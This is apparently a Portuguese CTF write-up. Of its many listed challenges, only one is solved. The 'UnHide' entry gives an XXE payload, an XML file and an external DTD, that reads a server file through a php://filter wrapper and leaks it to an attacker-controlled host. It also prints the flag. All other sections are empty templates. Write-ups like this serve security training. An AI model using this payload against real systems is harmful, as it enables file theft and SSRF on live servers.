## Sumário

* [Boot2Root](#boot2root)
    * [UnHide (300)](#unhide-300)
* [Cripto](#cripto)
    * [Cripto 001 (10)](#cripto-001-10)
    * [RSA 001 (10)](#rsa-001-10)
    * [Presente de Aniversário (25)](#presente-de-aniversário-25)
    * [RSA 002 (25)](#rsa-002-25)
    * [Enigma (50)](#enigma-50)
    * [Senha Perdida (50)](#senha-perdida-50)
    * [Mensagem Codificada (100)](#mensagem-codificada-100)
    * [Receita de Bolo (100)](#receita-de-bolo-100)
* [Forense](#forense)
    * [Arquivo Compactado (10)](#arquivo-compactado-10)
    * [Uma Simples Análise (10)](#uma-simples-análise-10)
    * [Break the Hash (25)](#break-the-hash-25)
    * [Um ataque ao banco (25)](#um-ataque-ao-banco-25)
    * [Validação de Dados (25)](#validação-de-dados-25)
    * [Backdoor (50)](#backdoor-50)
    * [Escovando Bits de Rede (50)](#escovando-bits-de-rede-50)
    * [Qual o conteúdo? (50)](#qual-o-conteúdo-50)
    * [Investigação (100)](#investigação-100)
    * [Vazamento de Informações (100)](#vazamento-de-informações-100)
* [Lógica](#lógica)
    * [Sequência (10)](#sequência-10)
    * [Sequência de Collatz (10)](#sequência-de-collatz-10)
    * [Rotas (50)](#rotas-50)
* [Mini Gamer](#mini-gamer)
    * [Adivinha (10)](#adivinha-10)
    * [Pokedex (50)](#pokedex-50)
* [Mini Web](#mini-web)
    * [Navi GPS (10)](#navi-gps-10)
    * [Ship (10)](#ship-10)
    * [Safe URL (25)](#safe-url-25)
    * [Solutions (25)](#solutions-25)
    * [Developer (50)](#developer-50)
    * [MDK (50)](#mdk-50)
    * [External (100)](#external-100)
    * [Mico (100)](#mico-100)
    * [Notes (150)](#notes-150)
    * [Techport (150)](#techport-150)
    * [Defense and Attack (200)](#defense-and-attack-200)
* [Osint](#osint)
    * [Informações de um arquivo! (10)](#informações-de-um-arquivo-10)
    * [Rastreio de IP (10)](#rastreio-de-ip-10)
    * [Dispositivo Antigo (25)](#dispositivo-antigo-25)
    * [Encontre a fotógrafa (25)](#encontre-a-fotógrafa-25)
    * [Hidden Flag (50)](#hidden-flag-50)
    * [Investigação de Voo (50)](#investigação-de-voo-50)
    * [A melhor rua para um gato! (100)](#a-melhor-rua-para-um-gato-100)
* [Outros](#outros)
    * [Look_Find_Replace (10)](#look_find_replace-10)
    * [Looping (10)](#looping-10)
    * [As mãozinhas (25)](#as-mãozinhas-25)
    * [Não é IPv4 (25)](#não-é-ipv4-25)
    * [O Banco Alq (50)](#o-banco-alq-50)
    * [O código obscuro (50)](#o-código-obscuro-50)
    * [Roubo ao Museu (50)](#roubo-ao-museu-50)
    * [Onion Services (100)](#onion-services-100)
    * [Publicidade de Limpeza (100)](#publicidade-de-limpeza-100)
* [Pwn](#pwn)
    * [Pwn01 (10)](#pwn01-10)
    * [Pwn02 (10)](#pwn02-10)
    * [Pwn03 (25)](#pwn03-25)
    * [Oculto.exe (50)](#ocultoexe-50)
    * [Pwn04 (50)](#pwn04-50)
* [Stego](#stego)
    * [Descoberta Histórica (10)](#descoberta-histórica-10)
    * [Quase Igual (10)](#quase-igual-10)
    * [Vaso de decoração (25)](#vaso-de-decoração-25)
    * [Fake Story (50)](#fake-story-50)
    * [Na Deepweb 2 (50)](#na-deepweb-2-50)
    * [Tinta Invisível (50)](#tinta-invisível-50)
    * [A Animação (100)](#a-animação-100)
    * [O lado oculto da lua (100)](#o-lado-oculto-da-lua-100)
    * [Arte (150)](#arte-150)

# Boot2Root

## UnHide (300)
### Descrição
Aplicação PHP com endpoint que permite utilização Arbitrária de Classes e Funções.

### Solução detalhada

Primeiramente, ao acessar unhide.app é possível observar que um código php está sendo executado ao realizar POST requests na pagina.

<img src="images/Pasted image 20230822154123.png">

O código PHP é vulnerável na medida em que permite que um atacante malicioso chame alguma classe com função nociva e cause danos e / ou exfiltre dados da aplicação.

Dessa forma, esses dados estão sendo acessados via json, analise o seguinte request


<img src="images/Pasted image 20230822154210.png">

Na imagem é utilizado a classe DOMDocument, por meio dela é possível fazer chamadas com a função load() que renderiza xml ao passar uma url como argumento.

Nesse contexto, torna-se evidente a possibilidade de exploração de XXE para SSRF ou Local File read.

Para explorar, o conteudo de xml.xml é

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://iphere:8000/xpl.dtd"> %ext;
%ext;
]>
<r></r>
```

E o conteudo de xpl.dtd é

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/.htaccess">
<!ENTITY % payload "<!ENTITY &#37; xpl SYSTEM 'http://iphere:8000/?leak=%data;'">
%payload;
%xpl;
```

O qual usa o php para ler o arquivo `/var/www/html/.htaccess` , que contém a flag.


<img src="images/Pasted image 20230822154617.png">

<img src="images/Pasted image 20230822154625.png">

### Flag
```
ALQ{PHP_1nt3rn4ls_For_Fun_4nd_Pr0f1t}
```

# Cripto

## Cripto 001 (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## RSA 001 (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Presente de Aniversário (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## RSA 002 (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Enigma (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Boot2Root

## UnHide (300)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Cripto

## Senha Perdida (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Mensagem Codificada (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Receita de Bolo (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Forense

## Arquivo Compactado (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Uma Simples Análise (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Break the Hash (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Um ataque ao banco (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Validação de Dados (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Backdoor (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Escovando Bits de Rede (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Qual o conteúdo? (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Investigação (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Vazamento de Informações (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Lógica

## Sequência (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Sequência de Collatz (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Rotas (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Mini Gamer

## Adivinha (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Pokedex (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Mini Web

## Navi GPS (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Ship (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Safe URL (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Solutions (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Developer (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## MDK (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## External (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Mico (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Notes (150)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Techport (150)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Defense and Attack (200)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Osint

## Informações de um arquivo! (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Rastreio de IP (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Dispositivo Antigo (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Encontre a fotógrafa (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Hidden Flag (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Investigação de Voo (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## A melhor rua para um gato! (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Outros

## Look_Find_Replace (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Looping (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## As mãozinhas (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Não é IPv4 (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## O Banco Alq (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## O código obscuro (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Roubo ao Museu (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Onion Services (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Publicidade de Limpeza (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Pwn

## Pwn01 (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Pwn02 (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Pwn03 (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Oculto.exe (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Pwn04 (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Stego

## Descoberta Histórica (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Quase Igual (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Vaso de decoração (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Fake Story (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Na Deepweb 2 (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Tinta Invisível (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## A Animação (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## O lado oculto da lua (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Arte (150)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada
